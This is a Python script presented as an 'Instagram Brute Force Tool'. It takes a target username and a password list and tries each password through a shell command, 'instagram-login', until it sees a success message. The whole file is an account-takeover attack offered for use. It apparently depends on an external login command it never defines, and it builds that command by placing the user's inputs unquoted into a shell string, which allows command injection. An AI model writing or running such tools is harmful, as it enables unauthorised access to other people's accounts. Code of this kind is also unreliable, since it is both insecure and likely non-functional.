import pyfiglet
import subprocess
import time
import colorama
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# ASCII Art Banner
banner = pyfiglet.figlet_format("Instagram Brute Force Tool", font="slant")
print(Fore.RED + banner + Style.RESET_ALL)

# Get username and password list path from user
username = input(Fore.GREEN + "Enter Instagram username: " + Style.RESET_ALL)
password_list_path = input(Fore.GREEN + "Enter path to password list file: " + Style.RESET_ALL)

# Open password list file
with open(password_list_path, 'r') as f:
    passwords = [line.strip() for line in f.readlines()]

# Start brute force attack
print(Fore.YELLOW + f"Starting brute force attack on {username}..." + Style.RESET_ALL)
start_time = time.time()

# Iterate over password list
for password in passwords:
    # Print current password being tried
    print(Fore.CYAN + f"Trying password: {password}" + Style.RESET_ALL)

    # Use subprocess to run Instagram login command with current password
    cmd = f"instagram-login -u {username} -p {password}"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Check if login was successful
    if "Login successful" in output.decode('utf-8'):
        print(Fore.GREEN + f"Correct password found: {password}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Stopping attack..." + Style.RESET_ALL)
        break

    # Wait for a short period of time before trying next password
    time.sleep(1)

# Print attack completion message
print(Fore.YELLOW + "Attack complete." + Style.RESET_ALL)
print(Fore.CYAN + f"Time taken: {time.time() - start_time} seconds" + Style.RESET_ALL)

